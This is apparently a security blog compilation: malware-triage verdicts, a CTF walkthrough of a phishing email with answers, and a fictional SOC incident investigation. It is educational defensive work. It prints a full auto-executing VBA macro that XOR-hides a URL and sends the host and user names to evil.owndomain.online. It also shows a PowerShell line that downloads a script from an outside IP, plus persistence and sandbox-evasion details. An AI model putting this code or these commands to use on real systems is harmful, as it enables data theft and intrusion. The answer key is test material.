Overall Verdict (Per Sample, Evidence Not Mixed)
docs.text:
EarthTime.exe: Medium-to-high confidence suspicious. It impersonates a known legitimate program, combines network, crypto, registry, and impersonation functions unusually, and shows heuristic packing with no known signature. A firm “malicious” label needs the real network/crypto calls traced, plus dynamic analysis or a detailed AV report (neither was done here).

Sample 2 (.NET sample): High confidence heavily obfuscated (Unicode names, control flow flattening, heuristic packing) with a likely in-memory loader class. The payload source and the malware family are not confirmed yet.

ccs.exe (Betruger): The strongest evidence is the open persistence pair (CreateServiceW + RegCreateKeyExW), together with careful, thread-safe hiding of other API calls and packing signs in .rsrc. Selective hiding of some functions but not others, with an encrypted, thread-safe cache, is a strong sign of deliberate design to avoid detection. This holds even without decrypting the full hidden API table or getting a final VirusTotal confirmation.

docs.title: All Samples
docs.text:
• Compute the ImpHash by hand from the import order (PEStudio/IDA) and compare it with public databases, without downloading any external report. Different malware families sometimes share the same import order, so this is a classification hint independent of SHA256.

وبس كدا ان اصبت فهو من عند الله وان اخطأت فهو من نفسي والشيطان :)

docs.title: DPhish — Phishing Email Analysis
docs.text:
🇪🇬 اقرأ بالعربي

CTF Writeup + Learning

We’re going to solve the challenge while thinking like an actual Forensics Engineer.

بسم الله :)

docs.title: Challenge Description
docs.text:
File: challenge.eml

DPhish — Phishing Email Analysis

You are a SOC analyst at ByPaid Solutions. An employee named Babar has reported a suspicious email they received from the HR department.

Your job is to investigate this email thoroughly:

  • Analyze the email headers to trace the true origin of this message
  • Examine all attachments — some may contain malicious content, and not all of them are immediately visible
  • Investigate the linked website referenced in the email body
  • Reverse-engineer any binaries or macros found in the attachments

Rules:

  • All analysis must be performed in an isolated VM/sandbox environment
  • Answers are case-insensitive
  • Some questions have limited attempts — read carefully before submitting
  • Hints are available but cost 100 points each

docs.title: Getting Started — Opening the File
docs.text:
First we open it on an isolated VM, because there might be malware in the attachments that auto-executes when we open the email — so let’s be careful.

cat challenge.eml

docs.title: Warm-up: Subject Line
docs.text:
Question: What is the subject line of the phishing email?

Answer: Urgent: Employee Salary Revision and Policy

docs.title: Q1 — Mail Gateway Hostname
docs.text:
Question: What is the hostname of the mail gateway that actually sent this email? (found in the Received header)

If you pay attention to the Received header you’ll find:

Received: from mail.evil.owndomain.online by mx.bf456

So it originally came from mail.evil.owndomain.online — someone picked it up and forwarded it to the domain hiding the main server. This is the attacker's actual server that's hosting the domain shown in the From field above.

The attacker can easily forge <em class="hh">From: hr@bypaid.io</em>. But Received headers get added by every mail server along the way — that's much harder to fake.

Answer: mail.evil.owndomain.online

docs.title: Q2 — Originating IP Address
docs.text:
Question: What is the originating IP address of the sender?

The IP is right next to the hostname in the same Received header.

Answer: 185.199.42.13

docs.title: Q3 — SPF Verification Result
docs.text:
Question: What is the SPF verification result for this email?

This is one of the three most important protocols in Header Analysis:

ProtocolWhat it does SPF : Is this IP allowed to send on behalf of this domain? DKIM : Was the email digitally signed by the domain? DMARC : What happens if SPF or DKIM fail?

It’s asking about SPF, so the answer is softfail — meaning the IP is suspicious, but the mail gateway's rules let it through to spam instead of outright rejecting it.

Answer: softfail

docs.title: Q4 — Reply-To Email Address
docs.text:
Question: What is the Reply-To email address?

Normally: From == Reply-To

But in this email, if you look carefully you’ll find:

From:     hr@bypaid.io                        ← looks legit to the victim
Reply-To: hr-support@evil.owndomain.online    ← hidden! 🚨

Answer: hr-support@evil.owndomain.online

docs.title: Q5 — Mail Client / Tool Used
docs.text:
Question: What mail client or tool was used to send this email? (include version)

Answer: PyMailer 3.2.1

docs.title: Q6 — Message-ID Domain
docs.text:
Question: What is the domain found in the Message-ID header?

Answer: evil.owndomain.online

docs.title: Phase 2 — Attachments Analysis
docs.text:
What engine/tool was used to create the PDF file? (include version)

Okay so it’s asking about the tool that made the PDF. What PDF? Are there even files in the email? If you scroll down a bit you’ll find the analysis for:

  • the email body itself

  • Salary_Report_2026.pdf

  • Policy_Update.doc

-Meeting_Invite.ics - Update_Tool.exe

  • text/html

docs.title: Extracting the Files
docs.text:
Let’s extract the files from the email with a simple script:

python3 << 'EOF'
import email
with open('challenge.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
for part in msg.walk():
    fn = part.get_filename()
    # ask each part: do you have a filename?
    if fn:
    # if yes → it's an attachment
        data = part.get_payload(decode=True)
        # get_payload(decode=True):
        # - give me the file contents
        # - decode=True: if the content is base64 encoded (as in MIME), decode it first
        open(fn, 'wb').write(data)
        # save the content in a file with its original name
        # 'wb' = write + binary
        print(f"✅ {fn} ({len(data):,} bytes)")
EOF

Output:

✅ Policy_Update.doc       (35,840 bytes)
✅ Meeting_Invite.ics      (760 bytes)
✅ Update_Tool.exe         (490,496 bytes)
✅ Salary_Report_2026.pdf  (2,764 bytes)

docs.title: Verifying the Files
docs.text:
We want more details about the files and to confirm their extensions — maybe something changed or there’s a double extension:

file Policy_Update.doc Meeting_Invite.ics Update_Tool.exe Salary_Report_2026.pdf

Policy_Update.doc  → Composite Document File V2 Document  (= OLE format = old Word)
Meeting_Invite.ics → ASCII text
Update_Tool.exe    → PE32+ executable x86-64, for MS Windows
Salary_Report.pdf  → PDF document, version 1.4

docs.title: Q7 — PDF Creation Tool
docs.text:
Question: What engine/tool was used to create the PDF file? (include version)

We use exiftool to see all the metadata:

exiftool Salary_Report_2026.pdf

You’ll find under Creator: wkhtmltopdf 0.12.6 — a tool that converts HTML pages to PDF.

Important difference:

  • Creator = the program that made the original content → wkhtmltopdf (converts HTML → PDF)
  • Producer = the PDF library that generated the actual PDF file → ReportLab

So the attacker built a professional-looking HTML page and converted it to PDF.

Answer: wkhtmltopdf 0.12.6

docs.title: All Questions Coming later is Answered By Same Screenshot too
Q8 — PDF Author
docs.text:
Question: Who is listed as the Author in the PDF metadata?

Answer: dphish_admin

docs.title: Q9 — PDF Producer
docs.text:
Question: What is the Producer listed in the PDF metadata? (include version)

Answer: ReportLab v4.1

docs.title: Q10 — Custom Reference Keyword
docs.text:
Question: What is the custom reference keyword hidden in the PDF metadata?

This reference keyword is used for emails that have an auto-reply configured.

Answer: CTF-2026-PHISH

docs.title: Q11 — Employee ID
docs.text:
Question: What is the Employee ID of the highlighted employee in the salary table?

Answer: EMP-2026-4491

docs.title: How Did We Know There’s a Macro?
docs.text:
Going back to the file command result:

Policy_Update.doc → Composite Document File V2 Document (= OLE format = old Word)

Older versions of Office used the same .doc extension for both regular files and macro-enabled files — unlike newer versions where regular files are .docx and macro files are .docm.

Also the command told us it’s OLE format — what does that mean?

OLE = Object Linking and Embedding A format/structure that bundles different types of data inside a single file. There’s a tool that unpacks this structure — and that’s exactly what we need.

olevba Policy_Update.doc

If you read the table you’ll find AutoExec — that means it's a macro. And if you notice MSXML2.XMLHTTP — that's the server it connects to. Plus XOR — and from that we knew it's a C2.

docs.title: Full Macro Code
docs.text:
'─────────────────────────────────────────────────────
' Triggers — run automatically when the file is opened
'─────────────────────────────────────────────────────
Sub AutoOpen()
    InitUpdate          ' ← calls InitUpdate immediately
End Sub
Sub Document_Open()     ' ← same thing, for compatibility with different versions
    InitUpdate
End Sub
'─────────────────────────────────────────────────────
' The real code - InitUpdate is the auto-execute subroutine
'─────────────────────────────────────────────────────
Sub InitUpdate()
    Dim encodedUrl() As Variant
    Dim xorKey As Byte
    Dim decodedUrl As String
    Dim i As Long
    xorKey = &H4D       ' XOR key = 0x4D (= 77 decimal)
    ' URL is obfuscated - can't read it directly
    encodedUrl = Array(&H25, &H39, &H39, &H3D, &H77, &H62, &H62, &H28, _
                       &H3B, &H24, &H21, &H63, &H22, &H3A, &H23, &H29, _
                       &H22, &H20, &H2C, &H24, &H23, &H63, &H22, &H23, _
                       &H21, &H24, &H23, &H28, &H62, &H2C, &H3D, &H24, _
                       &H62, &H2E, &H22, &H21, &H21, &H28, &H2E, &H39)
    ' Decode - XOR each byte with the key
    decodedUrl = ""
    For i = LBound(encodedUrl) To UBound(encodedUrl)
        decodedUrl = decodedUrl & Chr(CLng(encodedUrl(i)) Xor xorKey)
    Next i
    ' Collect machine info
    Dim computerName As String
    Dim userName As String
    computerName = Environ("COMPUTERNAME")   ' machine name
    userName     = Environ("USERNAME")       ' username
    ' Send data to C2 via HTTP POST
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", decodedUrl, False
    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objHTTP.send "host=" & computerName & "&user=" & userName
    Set objHTTP = Nothing
End Sub
'─────────────────────────────────────────────────────
' Dead Code - written but never called from anywhere!
'─────────────────────────────────────────────────────
Sub VerifyPolicy()
    Dim policyHash As String
    policyHash = "A1B2C3D4E5F6"    ' ← fake data
    Dim statusCode As Long
    statusCode = 0
End Sub

Start To Answer By this code

docs.title: Q12 — XOR Key
docs.text:
Question: What is the XOR key used to obfuscate the URL in the macro? (hex format, e.g. 0xAB)

If you focus on the code you’ll find: xorKey = &H4D

Answer: 0x4D

docs.title: Q13 — Deobfuscated C2 URL
docs.text:
Question: What is the full deobfuscated C2 URL in the macro?

You’ll find the encodedUrl in the code — we put it in CyberChef and got back:

encodedUrl = Array(&H25, &H39, &H39, &H3D, &H77, &H62, &H62, &H28, &H3B, &H24, &H21, &H63, &H22, &H3A, &H23, &H29, &H22, &H20, &H2C, &H24, &H23, &H63, &H22, &H23, &H21, &H24, &H23, &H28, &H62, &H2C, &H3D, &H24, &H62, &H2E, &H22, &H21, &H21, &H28, &H2E, &H39)

Answer: <a class="as rf" href="http://evil.owndomain.online/api/collect" rel="noopener ugc nofollow" target="_blank">http://evil.owndomain.online/api/collect</a>

docs.title: Q14 — HTTP Method
docs.text:
Question: What method does the macro use to send data to the C2?

If you look at the code you’ll find: objHTTP.Open "POST"

Answer: POST

docs.title: Q15 — Auto-execute Subroutine
docs.text:
Question: What is the name of the main auto-execute subroutine that performs the malicious action?

The name of the function where we found the URL was InitUpdate.

Answer: InitUpdate

docs.title: Q16 — Dead Code Function
docs.text:
Question: What is the name of the dead code function that is never called?

Dead Code means code that’s written just to look legit, but is never called — or gets called but isn’t a core function.

You’ll find it: VerifyPolicy

Answer: VerifyPolicy

docs.title: Q17 — Department Code
docs.text:
Question: What is the Department Code found in the document content?

Answer: FIN-0042

docs.title: Q18 — EXE C2 URL
docs.text:
Question: What is the full C2 server URL used by the executable for data exfiltration?

The link we found earlier was /collect and only sends hostname + username. So we're expecting to find something else that sends all the actual data.

Remember the tool we used earlier? wkhtmltopdf — and we said it converts HTML → PDF.

The attacker builds a phishing PDF:
  1. Makes an HTML page that looks like a legit HR portal
  2. Converts it to PDF using wkhtmltopdf
  3. Embeds a link to the fake website
  And the Creator shows up as "wkhtmltopdf"

Let’s look at the PDF again — file command said: PDF document, version 1.4.

Didn’t get much from that. Let’s try pulling all the strings from the binary?

The <em class="hh">endstream</em> isn't a URL — it's just part of the PDF structure itself.

Let’s try the other file — the exe: Update_Tool.exe

Nothing obvious in the metadata. Could run it through IDA, but let’s quickly check with strings first:

strings Update_Tool.exe

There it is — and /upload too, so the answer is:

Answer: <a class="as rf" href="http://evil.owndomain.online/upload" rel="noopener ugc nofollow" target="_blank">http://evil.owndomain.online/upload</a>

docs.title: All Questions Coming later is Answered By Same Screenshot too
Q19 — Registry Key Path
docs.text:
Question: What is the full registry key path used for persistence?

The most common registry keys used for persistence:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run      ← no Admin needed
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run      ← Admin required
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

KeyPrivilegeWhen it runsHKCUNo Admin neededEvery startup, current user onlyHKLMAdmin requiredEvery startup, all usersRun — Every startupRunOnce — Runs once then deletes itself

You’ll find: Software\Microsoft\Windows\CurrentVersion\Run

Answer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

docs.title: Q20 — Registry Value Name
docs.text:
Question: What is the registry value name used for the persistence entry?

What’s the difference between a Key and a Value?

<em class="hh">Key = the folder (HKCU\...\Run)</em>

<em class="hh">Value = the entry inside the folder HKCU\...\Run └── WindowsUpdateSvc = C:\...\Update_Tool.exe ↑ Value Name ↑ Value Data</em>

Answer: WindowsUpdateSvc

docs.title: Q21 — Target Applications
docs.text:
Question: Name the three applications whose data the malware targets (comma-separated, alphabetical order)

Answer: Discord, Google Chrome, Mozilla Firefox

docs.title: Q22 — User-Agent String
docs.text:
Question: What is the full User-Agent string used in HTTP requests by the malware?

Answer: Mozilla/5.0 (compatible; UpdateService/1.0)

docs.title: Q23 — Mutex Name
docs.text:
Question: What is the mutex name created by the malware?

What’s a Mutex?

Mutex = Mutual Exclusion = a lock

If two instances of the malware are running at the same time, they could conflict and cause issues. The Mutex prevents that:

  • First instance creates a mutex with a specific name
  • Second instance finds the mutex already exists → shuts itself down

Usually it’s a random name you’d find through the API it uses like CreateMutex | OpenMutex | WaitForSingle, but in our code here we found it with a plain readable name:

Answer: Global\DPhishMutex2026

docs.title: Q24 — VM/Sandbox Detection
docs.text:
Question: Name one process the malware checks for during VM/sandbox detection.

The first thing the malware checks to confirm it’s in a real environment vs a sandbox — it looks for names like:

vbox | vmware | sandbox | qemu | procmon | wireshark

Answer: vmtoolsd.exe

docs.title: Q25 — Target File Extensions
docs.text:
Question: What file extensions does the malware search for? (comma-separated, alphabetical)

.dat    ← browser data files (cookies, credentials)
.txt    ← text files that might contain passwords or notes
.wallet ← Cryptocurrency wallet files

Answer: .dat,.txt,.wallet

docs.title: Q26 — Verification PIN
docs.text:
Question: What is the Verification PIN?

Now we start looking at the phishing link — all of this on the sandbox.

We’ll find a page that looks like a login portal. For the scenario we have, it probably targets the user who was highlighted in the salary table.

Remember at the very beginning of the writeup when text/html showed up? We didn't know what to do with it — let's try decoding it now:

python3 << 'EOF'
import email
with open('challenge.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
for part in msg.walk():
    if part.get_content_type() == 'text/html':
        print(part.get_payload(decode=True).decode('utf-8', errors='ignore'))
EOF

This gives us the full HTML source of the email body and at the end you’ll find the PIN.

Answer: 729314

docs.title: Q27 — Transaction ID
docs.text:
Question: What is the Transaction ID displayed?

After logging in with everything, the Transaction ID shows up.

Answer: TXN-8A3F-QZ91

docs.title: Q28 — Internal Reference Number
docs.text:
Question: What is the Internal Reference Number shown on the success page?

Answer: REF-DPHISH-2026-0042

docs.title: Q29 — SHA256 of VBA Macro File
docs.text:
Question: What is the SHA256 hash of the attached file that contains a VBA macro?

sha256sum Policy_Update.doc

Answer: 2fed17ccf194e2b63734571b2a3b122363779ce920c20dc84798387de87a638

docs.title: Q30 — SHA256 of Info-Stealer
docs.text:
Question: What is the SHA256 hash of the compiled info-stealer malware hidden in the email?

That means the exe obviously.

sha256sum Update_Tool.exe

Answer: 6b8f21832549f4a61e66dfd910196146e152a03f00ab0b2c11f06e7c7a01025e

docs.title: Notes for a Real Investigation
docs.text:
Some steps we didn’t use here — but would matter in a real investigation:

Email Threading: Are there other emails from the same attacker? Same campaign?

Lateral Movement Check: Was this email sent to other people in the company?

grep -iE "^To:|^CC:" challenge.eml

Timestamp Analysis: Does the timing in the headers make sense? Are the timezones in the Received headers consistent?

BCC Detection: The email might have been sent to a large number of people in BCC.

Threat Intelligence: Verify every IP and URL we found against threat intel platforms (VirusTotal, OTX AlienVault).

Dynamic Analysis: We didn’t really need it here since the exe wasn’t heavily obfuscated — static analysis was enough.

That’s all — if I got it right, it’s from Allah, and if I made mistakes, that’s from myself or the devil.

docs.title: “The 2 AM Alert: A Full SOC Investigation, From PowerShell to Phishing Email”
“The 2 AM Alert: A Full SOC Investigation, From PowerShell to Phishing Email”
Not a Conversation, a New Case
docs.text:
🇪🇬 اقرأ بالعربي

Bismillah, a new episode of the Cyber Security chats. Today we’re picking up an INCIDENT and really understanding how to run an Investigation on it (mindset differs from analyst to analyst, but this is my current mindset, and of course if anyone has feedback to help me improve it, please go ahead).

In this post we’ll stick to a fictional scenario I asked the AI to build, just to figure out the best way to write these posts. Next time we start doing real reports.

Enough intro, let’s get into it.

docs.title: The Start
docs.text:
At 2:14 AM, the EDR at some company fired an alert like this:

“Suspicious PowerShell execution — the process used the <em class="vs">-EncodedCommand</em> parameter"

And the machine the alert came from belongs to a sales employee named Ahmed.

Who is Ahmed closing a four-million-pound deal with at 2 AM?

Let me think about this logically first: the time alone is already suspicious. Second, even if — hypothetically, for whatever reason — the employee was working, why would he have PowerShell access in the first place? Normally that’s a locked-down privilege for a regular user.

But wait, couldn’t this be an IT Admin on a night shift making a change on a machine? Some of them are allowed to use PowerShell normally, right?

Are you defending him now?

This brings us to the most important principle in the world of crime in general: the accused is innocent until proven guilty.

Even in the SOC? Even in the SOC.

Bottom line, the sentence that sums up the entire SOC field:

Create justifications, then prove them wrong. (Within limits you’ll learn with practice, of course.)

We don’t sit on one alert all day, but the short version is: if there’s any legitimate use for what you’re looking at, always try to prove it holds up — or that it’s actually malicious.

So now I have two working leads to start the investigation with, each with a hypothesis that could turn out to be legit.

docs.title: Starting the Investigation
docs.text:
Bismillah, where do we start? We said we’re not sure who logged onto the machine — IT admin or Ahmed?

Let’s start by reviewing the logon logs before 2:15 AM or so, and see how the session that ran PowerShell actually got established.

We check the logon event logs (explained this in the last post, go check it out):

Event ID 4624 (Successful Logon)

The most important thing in this Event ID is the logon type, which tells me exactly how access to the machine happened — whether it’s the user or someone else. The three most important types:

  • Type 2 = Interactive (someone physically sitting at the machine)
  • Type 3 = Network
  • Type 10 = RemoteInteractive (RDP)

Result: we found Logon Type = 10 (RDP)

Hold on — didn’t we say this could be an IT admin logging in remotely, normal stuff?

Well, if it’s IT, the IP should be known, right? And they should’ve logged into this machine at least once before?

Search on the SIEM — we found an internal IP that did log onto the machine, but with no prior history of ever connecting to this employee’s machine.

Search that IP in the EDR — turns out it belongs to a completely different sales employee’s machine! (Now we’re all in )

Containment is triggered immediately for the entire sales VLAN — we’ve confirmed there’s unauthorized lateral movement.

At some SOCs, an L1 analyst escalates here and their job on this case ends.

But what if we keep going?

docs.title: Decoding the PowerShell Command
docs.text:
Let’s look at the PowerShell command that came in with the EDR alert.

It was encoded, of course. Threw it into CyberChef, and got:

$s = New-Object Net.WebClient
$s.DownloadFile('http://185.174.55.69/p.ps1', 'C:\Users\Public\svchost.ps1')

So… it’s downloading a file with a name that mimics a legit Windows service process, from an IP whose reputation on VT comes back malicious.

Where did this come from though? We said another sales machine is the one that logged in — so how did the attacker even reach that first machine?

docs.title: Digging Into the Source Machine
docs.text:
Let’s dig into the source machine.

Looking at its logs, we find an actual RDP log to the machine the alert came from.

But where did they get the username and password for that first machine?

We covered AD attack processes before, and mentioned that credentials get dumped from memory — but we never said exactly where they live.

It’s in lsass.exe, which holds all the logon credential data on a machine. That's exactly the first thing that should come to mind to search for.

Let’s search the SIEM, and we get a log like this:

Event ID: 4688 (ProcessAccess)
Time: 11:41:03 PM
SourceImage: C:\Users\Public\update_svc.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010

And 0x1010 means read access into memory... exactly.

Wait, that path again — Public\update_svc.exe? Meaning "update process," fine, could genuinely be some update tool (remember our line: create justifications?).

But here’s what we should already know: Windows services live in one of two paths, System32 or System. Finding it in a Public path is a red flag right there!

So where did update_svc.exe come from? Was it downloaded?

docs.title: Tracing the Process Creation
docs.text:
Let’s search for its Process Creation log and see what it actually is:

Event ID: 1 (Process Creation on Sysmon)
CommandLine: "C:\Users\Public\update_svc.exe"
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm"

The log tells us it was launched from WINWORD.EXE.

A Word document, fine, could still be within legit territory — until we see where it came from:

\Downloads\Vendor_Invoice_Update.docm

Downloaded from a macro-enabled file? (.docm means macro-enabled). Took the shock there

Where from though?

Search the system logs by filename — Event ID: 15 represents a stream that holds extra info Windows attaches to a file, and inside it there's a parameter called Zone.Identifier, which tells you whether the file came from outside, from local, or from the cloud.

Event ID: 15
TargetFilename: C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm
Hash: SHA256=...
Contents: [ZoneTransfer]
ZoneId=3
ReferrerUrl=https://mail.google.com/...

We’ve got ZoneId=3 from mail.google.com.

Hmm… phishing email, then.

docs.title: Back to the Mail Gateway
docs.text:
Let’s search the Mail Gateway for the email.

Found a mail with the same hash as the macro file:

Recipient: Amr.adel@delta.corp
Subject: Updated Vendor Invoice — Please Review
Attachment: Vendor_Invoice_Update.docm
Attachment Hash: SHA256=b7e2a9...f41c (same hash that showed up in Event ID 1)
SPF: Fail
DKIM: Fail
DMARC: Fail

Failed every single mail reputation protocol, but got through because of a misconfiguration in the Mail Gateway rules.

Now, we need to know exactly what this macro does, for the Eradication phase later.

Take the macro’s hash, run Static Analysis (VT) and Dynamic Analysis (Hybrid or Any.run) on it.

We find it downloads a payload from the same external IP we saw earlier, and also creates a Scheduled Task.

docs.title: Persistence
docs.text:
Search Event ID: 4698 (Scheduled Task) in the logs, and we actually find something:

Task Content:
  <Exec>
    <Command>C:\Users\Public\update_svc.exe</Command>
  </Exec>
  <Trigger>
    <LogonTrigger>
    <Repetition><Interval>PT10M</Interval></Repetition>

LogonTrigger (checks in online every ten minutes), under the name MicrosoftEdgeUpdateTaskMachine.

We said that name looks legit at first glance — but the path isn’t Public like we mentioned! It’s the exact same path we already saw.

docs.title: Was There Any Data Leak?
docs.text:
Now we need to know what the attacker did after all this. Did any data leak? Did they pull down anything bigger?

Let’s check the Firewall and EDR for data exfiltration.

Found:

185.174.55.69: Outbound bytes = 4.2 KB

A small amount of data left from Amr’s machine (the source machine that had the email) — likely just a beacon check-in (the machine “pinging” that it’s alive, nothing more).

Also found:

185.174.55.69: Connection attempt to download p.ps1 → BLOCKED by EDR

From the machine the original alert came from.

That one would’ve been the follow-up stage — but it got stopped in time, alhamdulillah.

docs.title: Wrap-Up
docs.text:
And with that, we’re done, alhamdulillah. All that’s left is figuring out how many machines are affected beyond Ahmed’s and Amr’s.

We take this IP and run something called a Retro IOC — checking it against the rest of the fleet, to see if it has any footprint on the other sales machines or not.

And that’s it.

If I got it right, it’s from Allah; if I got it wrong, it’s from myself and Shaytan 🤍
